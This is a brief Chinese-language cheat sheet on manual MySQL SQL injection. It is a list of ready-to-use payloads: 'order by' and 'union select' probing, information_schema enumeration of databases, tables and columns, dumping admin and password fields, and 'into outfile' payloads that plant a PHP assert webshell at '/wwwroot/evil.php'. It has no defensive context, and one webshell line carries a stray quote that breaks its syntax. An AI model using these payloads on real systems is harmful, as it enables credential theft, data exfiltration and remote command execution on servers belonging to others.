## 05-sql注入

#### 一、mysql手工注入
	1、判断是否存在注入

	2、查询字段数
		order by 3 --+

	3、联合查询
		union select 1,2,3,4,5 --+
		version()              #获取mysql版本
		user()                 #数据库用户名
		database()             #数据库名
		@@datadir              #数据库路径
		@@version_compile_os   #操作系统版本

	4、查询所有数据库名
		mysql版本大于5.6.34
		union select 1,2,3,concat(group_concat(distinct+schema_name)),5 from information_schema.schemata --+

	5、查询当前数据库的表名
		union select 1,2,3,concat(group_concat(distinct+table_name)),5 from information_schema.tables where table_schema=0x66656e6269 --+

	6、查询表中的字段
		union select 1,2,3,concat(group_concat(distinct+column_name)),5 from information_schema.columns where table_name=0x61646d696e --+

	7、查询字段内容
		union select 1,2,admin,passwd,5 from 表名 limit 0,1 --+

	8、mysql写webshell
		union select 1,2,3,'<?php assert($_POST["cmd"]);?>’5 into outfile '/wwwroot/evil.php' --+

		 into outfile '/wwwroot/evil.php' fields terminated by '<?php assert($_POST["cmd"]);?>' --+
